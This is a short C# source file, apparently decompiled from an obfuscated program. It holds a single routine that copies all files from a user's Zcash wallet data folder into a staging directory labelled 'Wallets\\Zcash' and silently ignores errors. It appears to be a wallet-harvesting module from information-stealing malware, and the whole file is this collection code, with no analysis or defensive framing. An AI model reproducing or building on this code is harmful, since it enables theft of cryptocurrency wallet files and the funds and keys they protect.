using System.IO;

internal class Class72
{
	public static int int_0 = 0;

	public static string string_0 = "\\Wallets\\Zcash\\";

	public static void smethod_0(string string_1)
	{
		try
		{
			FileInfo[] files = new DirectoryInfo(Class38.string_3 + "\\Zcash\\").GetFiles();
			foreach (FileInfo fileInfo in files)
			{
				Directory.CreateDirectory(string_1 + string_0);
				fileInfo.CopyTo(string_1 + string_0 + fileInfo.Name);
			}
			Class36.int_12++;
		}
		catch
		{
		}
	}
}
